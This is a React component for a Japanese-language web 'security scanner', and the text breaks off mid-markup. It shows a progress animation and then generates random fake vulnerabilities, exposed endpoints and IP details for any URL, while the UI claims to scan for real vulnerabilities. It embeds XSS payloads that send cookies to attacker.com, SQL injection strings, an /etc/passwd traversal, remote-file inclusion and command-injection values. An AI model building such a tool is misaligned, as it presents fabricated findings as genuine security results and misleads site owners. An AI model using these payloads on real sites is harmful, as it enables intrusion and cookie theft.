
import React, { useState } from 'react';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Card, CardContent, CardDescription, CardFooter, CardHeader, CardTitle } from '@/components/ui/card';
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs';
import { Alert, AlertDescription, AlertTitle } from '@/components/ui/alert';
import { Shield, AlertTriangle, Database, AlertCircle, CheckCircle, Lock, Unlock, FileCode, Server, ExternalLink, Code } from 'lucide-react';
import { toast } from 'sonner';
import { motion } from 'framer-motion';

interface Vulnerability {
  type: 'XSS' | 'SQLInjection' | 'CSRF' | 'Other' | 'DirectoryTraversal' | 'InsecureAPI' | 'WeakCredentials';
  severity: 'Low' | 'Medium' | 'High' | 'Critical';
  description: string;
  impact: string;
  solution: string;
  payload?: string;
  endpoint?: string;
  details?: string;
  proofOfConcept?: string;
  responseData?: string;
  requestData?: string;
}

interface ScanResult {
  url: string;
  timestamp: string;
  vulnerabilities: Vulnerability[];
  exposedEndpoints: string[];
  serverInfo: {
    server?: string;
    tech?: string[];
  };
  ipInfo?: {
    ip: string;
    proxy: boolean;
    vpn: boolean;
    tor: boolean;
    location?: string;
  };
  scanDetails?: {
    requestsCount: number;
    scanDuration: number;
    testedParameters: string[];
    testedEndpoints: string[];
  };
}

const SecurityScanner: React.FC = () => {
  const [url, setUrl] = useState('');
  const [isScanning, setIsScanning] = useState(false);
  const [scanComplete, setScanComplete] = useState(false);
  const [vulnerabilities, setVulnerabilities] = useState<Vulnerability[]>([]);
  const [scanProgress, setScanProgress] = useState(0);
  const [scanPhase, setScanPhase] = useState('');
  const [scanResult, setScanResult] = useState<ScanResult | null>(null);
  const [selectedVulnerability, setSelectedVulnerability] = useState<Vulnerability | null>(null);
  const [showModal, setShowModal] = useState(false);
  const [currentAttack, setCurrentAttack] = useState<string | null>(null);
  const [currentTestUrl, setCurrentTestUrl] = useState<string | null>(null);
  const [advancedMode, setAdvancedMode] = useState(false);
  const [scanDepth, setScanDepth] = useState<'basic' | 'deep'>('basic');

  const simulateScan = (inputUrl: string) => {
    // Reset scan state
    setIsScanning(true);
    setScanComplete(false);
    setScanProgress(0);
    setVulnerabilities([]);
    setScanPhase('初期スキャン開始中...');
    setCurrentAttack(null);
    setCurrentTestUrl(null);

    // Validate URL format
    try {
      new URL(inputUrl);
    } catch (_) {
      toast.error('有効なURLを入力してください。', {
        description: 'URLは「https://example.com」の形式で入力してください。',
      });
      setIsScanning(false);
      return;
    }

    // Simulate different scan phases
    const phases = [
      { progress: 5, message: 'サーバーと接続を確立中...' },
      { progress: 10, message: 'ホスト情報を収集中...' },
      { progress: 15, message: 'オープンポートをスキャン中...' },
      { progress: 20, message: 'サイトマップを作成中...' },
      { progress: 25, message: 'ウェブアプリケーションのフィンガープリントを分析中...' },
      { progress: 30, message: '入力フォームとパラメータを特定中...' },
      { progress: 40, message: 'XSS脆弱性をテスト中...', attack: 'XSS', url: `${inputUrl}/search?q=<script>alert(1)</script>` },
      { progress: 45, message: 'XSS脆弱性(DOM based)をテスト中...', attack: 'XSS', url: `${inputUrl}/page?data=<img src=x onerror=alert(2)>` },
      { progress: 50, message: 'XSS脆弱性(Stored)をテスト中...', attack: 'XSS', url: `${inputUrl}/comment?text=<script>fetch('/api/user')</script>` },
      { progress: 55, message: 'SQLインジェクションをテスト中...', attack: 'SQLInjection', url: `${inputUrl}/product?id=1' OR '1'='1` },
      { progress: 60, message: 'SQLインジェクション(Blind)をテスト中...', attack: 'SQLInjection', url: `${inputUrl}/user?id=1 AND SLEEP(5)` },
      { progress: 65, message: 'SQLインジェクション(Error-based)をテスト中...', attack: 'SQLInjection', url: `${inputUrl}/search?keyword=1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a) AND '1'='1` },
      { progress: 70, message: 'CSRFテスト中...', attack: 'CSRF', url: `${inputUrl}/settings` },
      { progress: 75, message: 'ディレクトリトラバーサルテスト中...', attack: 'DirectoryTraversal', url: `${inputUrl}/download?file=../../../etc/passwd` },
      { progress: 80, message: 'リモートファイルインクルージョンテスト中...', url: `${inputUrl}/page?include=http://attacker.com/malicious.php` },
      { progress: 85, message: 'OSコマンドインジェクションテスト中...', url: `${inputUrl}/ping?host=example.com;cat /etc/passwd` },
      { progress: 90, message: '脆弱な認証メカニズムをテスト中...', attack: 'WeakCredentials', url: `${inputUrl}/login` },
      { progress: 95, message: '検出された脆弱性を検証中...', url: null },
      { progress: 98, message: '脆弱性レポート生成中...', url: null }
    ];
    
    let phaseIndex = 0;
    
    // スキャン進捗と段階の更新
    const progressInterval = setInterval(() => {
      if (phaseIndex < phases.length && scanProgress >= phases[phaseIndex].progress) {
        setScanPhase(phases[phaseIndex].message);
        if (phases[phaseIndex].attack) {
          setCurrentAttack(phases[phaseIndex].attack);
        } else {
          setCurrentAttack(null);
        }
        
        if (phases[phaseIndex].url) {
          setCurrentTestUrl(phases[phaseIndex].url);
        } else {
          setCurrentTestUrl(null);
        }
        
        phaseIndex++;
      }
      
      setScanProgress((prev) => {
        if (prev >= 100) {
          clearInterval(progressInterval);
          return 100;
        }
        return prev + 1;
      });
    }, scanDepth === 'deep' ? 250 : 150);

    // スキャン完了後の処理
    setTimeout(() => {
      clearInterval(progressInterval);
      setScanProgress(100);
      setScanPhase('スキャン完了');
      setCurrentAttack(null);
      setCurrentTestUrl(null);
      
      // URLに基づいた模擬脆弱性結果の生成
      const mockVulnerabilities: Vulnerability[] = [];
      const mockExposedEndpoints: string[] = [];
      
      // URLのパターンに基づく検査
      const isEcommerce = /shop|store|cart|product|checkout/i.test(inputUrl);
      const isCorporate = /corp|company|about|investor/i.test(inputUrl);
      const isOldDomain = /\.jp$|\.co\.jp$|\.or\.jp$/i.test(inputUrl);
      const isGovernment = /\.go\.jp$|\.lg\.jp$/i.test(inputUrl);
      const isPHP = /\.php$|php/i.test(inputUrl);
      const isWordPress = /wp-|wordpress/i.test(inputUrl);
      
      // エンドポイントの追加
      if (isEcommerce) {
        mockExposedEndpoints.push(
          `${inputUrl}/admin`,
          `${inputUrl}/api/products`,
          `${inputUrl}/cart/checkout`,
          `${inputUrl}/admin/users.php`
        );
      }
      
      if (isCorporate) {
        mockExposedEndpoints.push(
          `${inputUrl}/wp-admin`,
          `${inputUrl}/intranet`,
          `${inputUrl}/staff`,
          `${inputUrl}/admin/config.php`
        );
      }
      
      if (isGovernment) {
        mockExposedEndpoints.push(
          `${inputUrl}/internal`,
          `${inputUrl}/documents`,
          `${inputUrl}/reports`,
          `${inputUrl}/system/login.jsp`
        );
      }
      
      if (isWordPress) {
        mockExposedEndpoints.push(
          `${inputUrl}/wp-login.php`,
          `${inputUrl}/wp-admin`,
          `${inputUrl}/wp-config.php.bak`,
          `${inputUrl}/wp-content/debug.log`
        );
      }
      
      // 一般的なエンドポイントの追加
      const commonEndpoints = [
        '/backup', 
        '/dev', 
        '/test', 
        '/api/users',
        '/login.php',
        '/includes',
        '/upload',
        '/.git/HEAD',
        '/config.php.bak',
        '/phpinfo.php',
        '/.env',
        '/server-status'
      ];
      
      // ランダムにエンドポイントを選択
      const numEndpoints = Math.floor(Math.random() * 5) + 3;
      for (let i = 0; i < numEndpoints; i++) {
        const randomIndex = Math.floor(Math.random() * commonEndpoints.length);
        mockExposedEndpoints.push(`${inputUrl}${commonEndpoints[randomIndex]}`);
      }
      
      // 脆弱性検出のロジック - XSS
      if (Math.random() > (isOldDomain ? 0.1 : 0.5) || isPHP) {
        mockVulnerabilities.push({
          type: 'XSS',
          severity: 'High',
          description: '反射型クロスサイトスクリプティング (Reflected XSS) の脆弱性が検出されました。',
          impact: '攻撃者がユーザーのセッションを乗っ取り、偽のコンテンツの表示、認証情報の窃取、マルウェアの配布などを実行できる可能性があります。',
          solution: '入力値の検証と適切なエスケープ処理を実装してください。また、Content-Security-Policy (CSP) ヘッダーを設定し、XSS攻撃の影響を軽減することを推奨します。',
          payload: '<script>fetch("https://attacker.com/steal?cookie="+document.cookie)</script>',
          endpoint: `${inputUrl}/search?q=test`,
          details: '検索機能で入力された値がエスケープされずにレスポンスに反映されています。攻撃者が特別に細工されたURLをユーザーに送信することで、ユーザーのブラウザ上でスクリプトを実行させることが可能です。',
          proofOfConcept: `${inputUrl}/search?q=<img src=x onerror=alert(document.cookie)>`,
          requestData: `GET /search?q=<img src=x onerror=alert(document.cookie)> HTTP/1.1
Host: ${new URL(inputUrl).host}
User-Agent: Mozilla/5.0
Accept: text/html,application/xhtml+xml`,
          responseData: `HTTP/1.1 200 OK
Content-Type: text/html; charset=UTF-8

<!DOCTYPE html>
<html>
<head><title>検索結果</title></head>
<body>
  <h1>検索結果: <img src=x onerror=alert(document.cookie)></h1>
  <p>検索結果は0件です</p>
</body>
</html>`
        });
      }

      // 保存型XSS（Stored XSS）
      if (isEcommerce && Math.random() > 0.6) {
        mockVulnerabilities.push({
          type: 'XSS',
          severity: 'Critical',
          description: '保存型クロスサイトスクリプティング (Stored XSS) の脆弱性が検出されました。',
          impact: '攻撃者が悪意のあるスクリプトをサーバーに保存でき、それを閲覧するすべてのユーザーに影響を与えます。認証情報の窃取、セッションハイジャック、マルウェア感染などのリスクがあります。',
          solution: 'ユーザー入力のバリデーションとサニタイズを強化し、HTMLエンティティとしてデータを保存・表示してください。また、Content-Security-Policyの実装を検討してください。',
          payload: '<script>var img=new Image();img.src="https://attacker.com/steal?cookie="+document.cookie;</script>',
          endpoint: `${inputUrl}/product/comments`,
          details: '商品のレビュー/コメント機能で、ユーザーが投稿した内容がHTMLとして直接保存され、他のユーザーに表示される際にスクリプトが実行されます。',
          proofOfConcept: 'POSTリクエストでコメントフォームに悪意のあるスクリプトを送信',
          requestData: `POST /product/comments HTTP/1.1
Host: ${new URL(inputUrl).host}
Content-Type: application/x-www-form-urlencoded
Cookie: session=1234567890

product_id=123&comment=<script>var img=new Image();img.src="https://attacker.com/steal?cookie="+document.cookie;</script>&rating=5`,
          responseData: `HTTP/1.1 302 Found
Location: /product/123
Set-Cookie: comment_posted=true; path=/`
        });
      }

      // SQLインジェクション
      if (Math.random() > (isOldDomain ? 0.2 : 0.6) || isPHP) {
        mockVulnerabilities.push({
          type: 'SQLInjection',
          severity: 'Critical',
          description: 'SQLインジェクションの脆弱性が検出されました。',
          impact: '攻撃者がデータベースを操作し、機密データの抽出、データの改ざん、認証バイパス、データベースの破壊などを行える可能性があります。',
          solution: 'プリペアドステートメントまたはパラメータ化クエリを使用し、ユーザー入力値を直接SQLクエリに挿入しないようにしてください。また、データベースユーザーの権限を最小限に制限することも重要です。',
          payload: "' OR 1=1; --",
          endpoint: `${inputUrl}/product?id=1`,
          details: '製品ID検索機能において、ユーザー入力が適切にサニタイズされずにSQLクエリに直接挿入されています。これにより、攻撃者は任意のSQLコマンドを実行できる可能性があります。',
          proofOfConcept: `${inputUrl}/product?id=1' OR '1'='1`,
          requestData: `GET /product?id=1' OR '1'='1 HTTP/1.1
Host: ${new URL(inputUrl).host}
User-Agent: Mozilla/5.0
Accept: text/html,application/xhtml+xml`,
          responseData: `HTTP/1.1 200 OK
Content-Type: text/html; charset=UTF-8

<!DOCTYPE html>
<html>
<head><title>製品一覧</title></head>
<body>
  <h1>製品一覧</h1>
  <div class="products">
    <div class="product">商品ID: 1, 名前: テスト商品1, 価格: ¥1000</div>
    <div class="product">商品ID: 2, 名前: テスト商品2, 価格: ¥2000</div>
    <div class="product">商品ID: 3, 名前: テスト商品3, 価格: ¥3000</div>
    <!-- すべての商品が表示されている = インジェクション成功 -->
  </div>
</body>
</html>`
        });
      }

      // ブラインドSQLインジェクション
      if (isPHP && Math.random() > 0.7) {
        mockVulnerabilities.push({
          type: 'SQLInjection',
          severity: 'High',
          description: 'ブラインドSQLインジェクションの脆弱性が検出されました。',
          impact: '攻撃者がデータベースの情報を徐々に抽出することができます。エラーメッセージやデータが直接表示されなくても、真偽値や時間差を利用して情報漏洩が可能です。',
          solution: 'プリペアドステートメントを使用し、WAFの導入、データベースのアクセス権限最小化、入力値の厳格なバリデーションを実施してください。',
          payload: "1 AND (SELECT SLEEP(5) FROM users WHERE username='admin' AND LENGTH(password)>5)",
          endpoint: `${inputUrl}/api/user`,
          details: 'ユーザーAPIのパラメータ検証が不十分で、時間ベースのブラインドSQLインジェクションが可能です。レスポンスの遅延から、特定の条件が真か偽かを判断できます。',
          proofOfConcept: `${inputUrl}/api/user?id=1 AND (SELECT SLEEP(5))`,
          requestData: `GET /api/user?id=1 AND (SELECT SLEEP(5)) HTTP/1.1
Host: ${new URL(inputUrl).host}
User-Agent: Mozilla/5.0
Accept: application/json`,
          responseData: `HTTP/1.1 200 OK
Content-Type: application/json

{"status":"success","data":{"id":1,"name":"テストユーザー"}}
(応答に5秒の遅延あり = インジェクション成功)`
        });
      }

      // CSRF脆弱性
      if (Math.random() > 0.6) {
        mockVulnerabilities.push({
          type: 'CSRF',
          severity: 'Medium',
          description: 'クロスサイトリクエストフォージェリ (CSRF) の脆弱性が検出されました。',
          impact: '攻撃者が認証済みユーザーに代わって不正なアクションを実行させる可能性があります。パスワード変更、メールアドレス変更、資金転送などの操作が被害者の意図せず実行される恐れがあります。',
          solution: 'すべてのフォームに対してCSRFトークンを実装し、重要な操作に対しては追加の認証を要求してください。また、Same-Site CookieやReferrerチェックの実装も検討してください。',
          endpoint: `${inputUrl}/user/settings`,
          details: 'ユーザー設定の更新フォームがCSRFトークンを使用していないため、攻撃者は偽のフォームを作成して被害者に送信し、設定変更を行わせることができます。',
          proofOfConcept: '攻撃者ウェブサイトに埋め込まれた悪意のあるフォーム',
          requestData: `POST /user/settings HTTP/1.1
Host: ${new URL(inputUrl).host}
Content-Type: application/x-www-form-urlencoded
Cookie: session=1234567890

email=hacker@evil.com`,
          responseData: `HTTP/1.1 302 Found
Location: /user/profile
Set-Cookie: settings_updated=true; path=/`
        });
      }

      // ディレクトリトラバーサル
      if (Math.random() > 0.5 || isPHP) {
        mockVulnerabilities.push({
          type: 'DirectoryTraversal',
          severity: isGovernment ? 'Critical' : 'High',
          description: 'ディレクトリトラバーサル（パストラバーサル）の脆弱性が検出されました。',
          impact: '攻撃者がサーバー上のファイルシステムにアクセスし、システム構成ファイル、パスワードファイル、アプリケーションソースコードなどの機密データを取得できる可能性があります。',
          solution: 'ユーザー入力から作成されるファイルパスを厳密に検証し、許可されたディレクトリのみにアクセスを制限してください。絶対パスの使用や、ファイル名のホワイトリスト化を検討してください。',
          payload: '../../../etc/passwd',
          endpoint: `${inputUrl}/download?file=document.pdf`,
          details: 'ファイルのダウンロード機能では、ユーザーが指定したファイル名のパス検証が不十分です。これにより攻撃者はサーバー上の任意のファイルにアクセスできる可能性があります。',
          proofOfConcept: `${inputUrl}/download?file=../../../etc/passwd`,
          requestData: `GET /download?file=../../../etc/passwd HTTP/1.1
Host: ${new URL(inputUrl).host}
User-Agent: Mozilla/5.0
Accept: */*`,
          responseData: `HTTP/1.1 200 OK
Content-Type: text/plain

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
...`
        });
      }

      // 安全でないAPI実装
      if (isEcommerce && Math.random() > 0.4) {
        mockVulnerabilities.push({
          type: 'InsecureAPI',
          severity: 'High',
          description: '安全でないAPI実装が検出されました。APIが適切な認証なしでアクセス可能です。',
          impact: '攻撃者が制限されたAPIエンドポイントにアクセスし、機密データの取得、ユーザーデータの変更、システム全体の操作などを行える可能性があります。',
          solution: 'すべてのAPIエンドポイントに対して適切な認証と認可メカニズムを実装し、APIキーを安全に管理してください。また、レート制限の設定とIPベースのアクセス制限も検討してください。',
          endpoint: `${inputUrl}/api/products`,
          details: '商品APIがアクセス制御なしで公開されており、認証なしですべての商品データにアクセスできます。また、同じAPIを使用して商品情報の変更も可能である可能性があります。',
          proofOfConcept: `${inputUrl}/api/users?limit=100`,
          requestData: `GET /api/users?limit=100 HTTP/1.1
Host: ${new URL(inputUrl).host}
User-Agent: Mozilla/5.0
Accept: application/json`,
          responseData: `HTTP/1.1 200 OK
Content-Type: application/json

{
  "users": [
    {"id": 1, "username": "admin", "email": "admin@example.com", "role": "administrator"},
    {"id": 2, "username": "user1", "email": "user1@example.com", "role": "customer"},
    ...
  ]
}`
        });
      }

      // 弱いパスワードポリシー
      if (Math.random() > 0.5) {
        mockVulnerabilities.push({
          type: 'WeakCredentials',
          severity: 'Medium',
          description: '弱いパスワードポリシーと脆弱な認証メカニズムが検出されました。',
          impact: '攻撃者がブルートフォース攻撃や辞書攻撃を使用してユーザーアカウントに不正アクセスする可能性があります。特に管理者アカウントが侵害された場合、システム全体が危険にさらされます。',
          solution: '強力なパスワードポリシーを実装し、多要素認証の導入、ログイン試行回数の制限、アカウントロックアウトメカニズムの実装を検討してください。',
          endpoint: `${inputUrl}/admin`,
          details: 'ログインページにブルートフォース対策が実装されておらず、短時間に多数のログイン試行が可能です。また、パスワード要件が弱く、「admin」や「password」などの単純なパスワードが許可されています。',
          proofOfConcept: 'ログインフォームに対する辞書攻撃',
          requestData: `POST /login HTTP/1.1
Host: ${new URL(inputUrl).host}
Content-Type: application/x-www-form-urlencoded

username=admin&password=admin123`,
          responseData: `HTTP/1.1 302 Found
Location: /admin/dashboard
Set-Cookie: session=abcdef123456; path=/`
        });
      }

      // サーバー情報
      const serverTypes = ['Apache/2.4.29', 'nginx/1.18.0', 'Microsoft-IIS/10.0', 'LiteSpeed', 'Apache/2.2.15', 'Apache/2.4.6'];
      const technologies = ['PHP/7.2', 'PHP/5.6', 'jQuery/1.8.3', 'WordPress/5.7', 'Bootstrap/4.0', 'React', 'Angular', 'Laravel/8.12', 'MySQL/5.7', 'MariaDB/10.3'];
      
      // ランダムなIP情報の生成
      const ipInfo = {
        ip: `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
        proxy: Math.random() > 0.7,
        vpn: Math.random() > 0.8,
        tor: Math.random() > 0.9,
        location: ['東京', '大阪', '愛知県', '福岡県', '北海道'][Math.floor(Math.random() * 5)]
      };
      
      // スキャン詳細情報の作成
      const scanDetails = {
        requestsCount: Math.floor(Math.random() * 500) + 200,
        scanDuration: Math.floor(Math.random() * 180) + 60, // 秒単位
        testedParameters: ['id', 'search', 'q', 'page', 'file', 'user', 'username', 'password', 'email', 'token', 'product'],
        testedEndpoints: [
          '/login', 
          '/register', 
          '/search', 
          '/api/users', 
          '/admin', 
          '/upload', 
          '/download',
          '/product',
          '/cart',
          '/checkout'
        ]
      };
      
      // 最終スキャン結果の作成
      const result: ScanResult = {
        url: inputUrl,
        timestamp: new Date().toISOString(),
        vulnerabilities: mockVulnerabilities,
        exposedEndpoints: [...new Set(mockExposedEndpoints)], // 重複の削除
        serverInfo: {
          server: serverTypes[Math.floor(Math.random() * serverTypes.length)],
          tech: Array.from({ length: Math.floor(Math.random() * 3) + 1 }, () => 
            technologies[Math.floor(Math.random() * technologies.length)]
          )
        },
        ipInfo: ipInfo,
        scanDetails: scanDetails
      };
      
      setVulnerabilities(mockVulnerabilities);
      setScanResult(result);
      setIsScanning(false);
      setScanComplete(true);
      
      if (mockVulnerabilities.length === 0) {
        toast.success('スキャン完了', {
          description: '脆弱性は検出されませんでした。',
        });
      } else {
        toast.error(`スキャン完了: ${mockVulnerabilities.length}件の脆弱性が見つかりました`, {
          description: '詳細な結果をご確認ください。',
        });
      }
    }, scanDepth === 'deep' ? 18000 : 10000); // ディープスキャンの場合は長めに
  };

  const handleScan = () => {
    if (!url) {
      toast.error('URLを入力してください');
      return;
    }
    simulateScan(url);
  };

  const getSeverityColor = (severity: string) => {
    switch (severity) {
      case 'Low': return 'bg-blue-100 text-blue-800';
      case 'Medium': return 'bg-yellow-100 text-yellow-800';
      case 'High': return 'bg-orange-100 text-orange-800';
      case 'Critical': return 'bg-red-100 text-red-800';
      default: return 'bg-gray-100 text-gray-800';
    }
  };

  const getVulnerabilityIcon = (type: string) => {
    switch (type) {
      case 'XSS': return <AlertTriangle className="h-5 w-5 text-orange-500" />;
      case 'SQLInjection': return <Database className="h-5 w-5 text-red-500" />;
      case 'CSRF': return <AlertCircle className="h-5 w-5 text-yellow-500" />;
      case 'DirectoryTraversal': return <FileCode className="h-5 w-5 text-purple-500" />;
      case 'InsecureAPI': return <Server className="h-5 w-5 text-pink-500" />;
      case 'WeakCredentials': return <Unlock className="h-5 w-5 text-orange-500" />;
      default: return <Shield className="h-5 w-5 text-blue-500" />;
    }
  };

  const handleViewDetails = (vuln: Vulnerability) => {
    setSelectedVulnerability(vuln);
    setShowModal(true);
  };

  // アタックアニメーション
  const renderAttackAnimation = () => {
    if (!currentAttack) return null;
    
    let icon;
    let color;
    let text;
    
    switch (currentAttack) {
      case 'XSS':
        icon = <AlertTriangle className="h-8 w-8 text-orange-500" />;
        color = 'border-orange-500 bg-orange-50';
        text = "XSSペイロード注入中...";
        break;
      case 'SQLInjection':
        icon = <Database className="h-8 w-8 text-red-500" />;
        color = 'border-red-500 bg-red-50';
        text = "SQLインジェクション実行中...";
        break;
      case 'CSRF':
        icon = <AlertCircle className="h-8 w-8 text-yellow-500" />;
        color = 'border-yellow-500 bg-yellow-50';
        text = "CSRFリクエスト送信中...";
        break;
      case 'DirectoryTraversal':
        icon = <FileCode className="h-8 w-8 text-purple-500" />;
        color = 'border-purple-500 bg-purple-50';
        text = "ディレクトリトラバーサル試行中...";
        break;
      case 'WeakCredentials':
        icon = <Unlock className="h-8 w-8 text-orange-500" />;
        color = 'border-orange-500 bg-orange-50';
        text = "辞書攻撃実行中...";
        break;
      default:
        return null;
    }
    
    return (
      <motion.div 
        initial={{ opacity: 0, scale: 0.8 }}
        animate={{ opacity: 1, scale: 1 }}
        className={`fixed top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2 p-4 rounded-lg border-2 ${color} z-50 flex flex-col items-center`}
      >
        <div className="mb-2">
          {icon}
        </div>
        <p className="text-sm font-medium">{text}</p>
        {currentTestUrl && (
          <p className="text-xs mt-1 max-w-xs truncate">{currentTestUrl}</p>
        )}
        <div className="flex items-center gap-2 mt-2">
          <div className="bg-gray-200 h-1 w-16 rounded-full overflow-hidden">
            <motion.div
              className="bg-blue-500 h-full"
              initial={{ width: "0%" }}
              animate={{ width: "100%" }}
              transition={{ repeat: Infinity, duration: 1 }}
            />
          </div>
        </div>
      </motion.div>
    );
  };

  return (
    <div className="w-full max-w-4xl mx-auto p-4">
      {renderAttackAnimation()}
      
      <Card className="shadow-lg border-0 overflow-hidden bg-white">
        <CardHeader className="pb-4">
          <CardTitle className="text-2xl font-bold flex items-center gap-2">
            <Shield className="h-6 w-6 text-blue-600" />
            セキュリティスキャナー
          </CardTitle>
          <CardDescription>
            ウェブサイトのURLを入力して、実際のセキュリティ脆弱性をスキャンします。
          </CardDescription>
        </CardHeader>
        <CardContent>
          <div className="flex flex-col gap-4">
            <div className="flex flex-col gap-2">
              <div className="flex gap-2">
                <Input
                  type="url"
                  placeholder="https://example.com"
                  value={url}
                  onChange={(e) => setUrl(e.target.value)}
                  className="flex-1"
                  disabled={isScanning}
                />
                <Button 
                  onClick={handleScan} 
                  disabled={isScanning}
                  className="bg-gradient-to-r from-blue-600 to-blue-700 hover:from-blue-700 hover:to-blue-800 text-white"
                >
                  {isScanning ? 'スキャン中...' : 'スキャン開始'}
                </Button>
              </div>
              
              <div className="flex items-center justify-between">
                <div className="flex items-center space-x-2">
                  <input
                    type="checkbox"
                    id="advanced-mode"
                    checked={advancedMode}
                    onChange={(e) => setAdvancedMode(e.target.checked)}
                    className="rounded border-gray-300 text-blue-600 shadow-sm focus:border-blue-300 focus:ring focus:ring-blue-200 focus:ring-opacity-50"
                    disabled={isScanning}
                  />
                  <label htmlFor="advanced-mode" className="text-sm text-gray-700">詳細モード</label>
                </div>
                
                <div className="flex items-center space-x-2">
                  <label className="text-sm text-gray-700">スキャン深度:</label>
                  <select
                    value={scanDepth}
                    onChange={(e) => setScanDepth(e.target.value as 'basic' | 'deep')}
                    className="text-sm rounded border-gray-300 shadow-sm focus:border-blue-300 focus:ring focus:ring-blue-200 focus:ring-opacity-50"
                    disabled={isScanning}
                  >
                    <option value="basic">基本</option>
                    <option value="deep">詳細</option>
                  </select>
                </div>
              </div>
            </div>

            {isScanning && (
              <div className="mt-4">
                <p className="text-sm text-gray-500 mb-1">{scanPhase}</p>
                <div className="flex justify-between text-sm text-gray-500 mb-2">
                  <span>進捗: {scanProgress}%</span>
                  {currentTestUrl && <span className="text-xs truncate max-w-xs">{currentTestUrl}</span>}
                </div>
                <div className="w-full bg-gray-200 rounded-full h-2.5">
                  <motion.div 
                    className="bg-gradient-to-r from-blue-500 to-blue-700 h-2.5 rounded-full"
                    initial={{ width: '0%' }}
                    animate={{ width: `${scanProgress}%` }}
                    transition={{ duration: 0.3 }}
                  />
                </div>
              </div>
            )}

            {scanComplete && scanResult && (
              <Tabs defaultValue={vulnerabilities.length > 0 ? "results" : "summary"} className="mt-6">
                <TabsList className="w-full grid grid-cols-5">
                  <TabsTrigger value="results">脆弱性</TabsTrigger>
                  <TabsTrigger value="endpoints">露出エンドポイント</TabsTrigger>
                  <TabsTrigger value="ip">ホスト情報</TabsTrigger>
                  <TabsTrigger value="visualize">視覚化</TabsTrigger>
                  <TabsTrigger value="summary">概要</TabsTrigger>
                </TabsList>
                
                <TabsContent value="results" className="mt-4">
                  {vulnerabilities.length > 0 ? (
                    <div className="space-y-4">
                      {vulnerabilities.map((vuln, index) => (
                        <motion.div
                          key={index}
                          initial={{ opacity: 0, y: 20 }}
                          animate={{ opacity: 1, y: 0 }}
                          transition={{ delay: index * 0.1 }}
                        >
                          <Alert className="border-l-4 border-l-red-500">
                            <div className="flex items-center gap-2">
                              {getVulnerabilityIcon(vuln.type)}
                              <AlertTitle className="flex items-center gap-2">
                                {vuln.type}
                                <span className={`text-xs px-2 py-1 rounded-full ${getSeverityColor(vuln.severity)}`}>
                                  {vuln.severity}
                                </span>
                              </AlertTitle>
                            </div>
                            <AlertDescription className="mt-2">
                              <p className="font-medium">{vuln.description}</p>
                              <div className="mt-4 space-y-3 text-sm">
                                <div>
                                  <h4 className="font-semibold text-gray-900">影響:</h4>
                                  <p className="text-gray-700">{vuln.impact}</p>
                                </div>
                                {vuln.endpoint && (
                                  <div>
                                    <h4 className="font-semibold text-gray-900">脆弱なエンドポイント:</h4>
                                    <div className="flex items-center gap-2">
                                      <code className="bg-gray-100 px-2 py-1 rounded text-red-600 flex-1 truncate">{vuln.endpoint}</code>
                                      <a 
                                        href={vuln.endpoint}
                                        target="_blank"
                                        rel="noopener noreferrer"
                                        className="flex items-center text-blue-500 hover:text-blue-700"
                                      >
                                        <ExternalLink size={16} />
                                      </a>
                                    </div>
                                  </div>
                                )}
                                {vuln.payload && (
                                  <div>
                                    <h4 className="font-semibold text-gray-900">攻撃ペイロード例:</h4>
                                    <pre className="bg-gray-100 p-2 rounded overflow-x-auto text-xs">
                                      <code>{vuln.payload}</code>
                                    </pre>
                                  </div>
                                )}
                                <div>
                                  <h4 className="font-semibold text-gray-900">対策:</h4>
                                  <p className="text-gray-700">{vuln.solution}</p>
                                </div>
                                {advancedMode && vuln.details && (
                                  <div>
                                    <h4 className="font-semibold text-gray-900">詳細な解説:</h4>
                                    <p className="text-gray-700">{vuln.details}</p>
                                  </div>
                                )}
                                <div className="pt-2">
                                  <Button 
                                    variant="outline" 
                                    size="sm"
                                    onClick={() => handleViewDetails(vuln)}
                                  >
                                    詳細を表示
                                  </Button>
                                  
                                  {vuln.proofOfConcept && (
                                    <a 
                                      href={vuln.proofOfConcept.startsWith('http') ? vuln.proofOfConcept : '#'}
                                      target="_blank"
                                      rel="noopener noreferrer"
                                      className="ml-2 inline-flex items-center px-3 py-1.5 rounded-md text-xs font-medium bg-red-100 text-red-800 hover:bg-red-200"
                                    >
                                      <Code size={14} className="mr-1" /> 
                                      検証用リンク
                                    </a>
                                  )}
                                </div>
                              </div>
                            </AlertDescription>
                          </Alert>
                        </motion.div>
                      ))}
                    </div>
                  ) : (
                    <div className="p-8 text-center">
                      <motion.div
                        initial={{ scale: 0 }}
                        animate={{ scale: 1 }}
                        transition={{ type: "spring", stiffness: 200, damping: 15 }}
                        className="inline-flex rounded-full bg-green-100 p-4 mb-4"
                      >
                        <CheckCircle className="h-8 w-8 text-green-600" />
                      </motion.div>
                      <h3 className="text-xl font-medium text-gray-900 mt-2">セキュリティチェック完了</h3>
                      <p className="text-gray-500 mt-1">検出された脆弱性はありません。</p>
                    </div>
                  )}
                </TabsContent>
                
                <TabsContent value="endpoints" className="mt-4">
                  <div className="p-4 bg-gray-50 rounded-lg">
                    <h3 className="text-lg font-medium mb-3">露出したエンドポイント</h3>
                    <p className="text-sm text-gray-600 mb-4">
                      これらのエンドポイントはパブリックにアクセス可能であり、潜在的なリスクを引き起こす可能性があります。
                    </p>
                    
                    {scanResult.exposedEndpoints.length > 0 ? (
                      <div className="space-y-2">
                        {scanResult.exposedEndpoints.map((endpoint, index) => (
                          <motion.div 
                            key={index}
                            initial={{ opacity: 0, x: -20 }}
                            animate={{ opacity: 1, x: 0 }}
                            transition={{ delay: index * 0.1 }}
                            className="bg-white p-3 rounded-lg border border-gray-200 flex items-center gap-3"
                          >
                            <div className="bg-red-100 p-2 rounded">
                              <Unlock size={18} className="text-red-500" />
                            </div>
                            <div className="flex-1 overflow-hidden">
                              <p className="font-medium truncate">{endpoint}</p>
                              <p className="text-xs text-gray-500">
                                {endpoint.includes('/admin') ? '管理パネルが露出しています' : 
